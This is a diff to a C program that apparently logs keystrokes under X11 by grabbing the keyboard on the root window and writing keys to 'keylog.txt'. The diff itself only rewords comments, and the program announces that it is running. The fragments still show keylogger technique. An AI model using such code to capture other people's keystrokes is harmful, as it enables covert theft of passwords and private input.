@@ -23,10 +23,10 @@ void cleanup() {
     printf("Program exited cleanly.\n");
 }
 
-// Signal handler for graceful termination
+// Signal handler for neat termination
 void handle_signal(int signal) {
     printf("\nSignal %d received. Cleaning up and exiting...\n", signal);
-    running = 0;  // Stop the main loop
+    running = 0;  // Stops the main loop
 }
 
 // Function to log a key to the file
@@ -35,7 +35,7 @@ void log_key(const char *key) {
         if (fprintf(file, "%s\n", key) < 0) {
             perror("Error writing to file");
         }
-        fflush(file);  // Ensure data is written immediately
+        fflush(file);  // make sure data is written immediately
     }
 }
 
@@ -53,10 +53,10 @@ int main() {
     // Open the root window
     root = DefaultRootWindow(display);
 
-    // Set input mask to listen for key press and release events
+    // Sets the input mask to listen for key press and release events
     XSelectInput(display, root, KeyPressMask | KeyReleaseMask);
 
-    // Grab the keyboard input
+    // Grabs the keyboard input
     if (XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime) != GrabSuccess) {
         fprintf(stderr, "Failed to grab keyboard\n");
         XCloseDisplay(display);
@@ -73,7 +73,7 @@ int main() {
 
     printf("Keylogger started. Logging to 'keylog.txt'. Press Ctrl+C to exit.\n");
 
-    // Setup signal handler for graceful termination
+    // Setup signal handler for neat termination
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
 
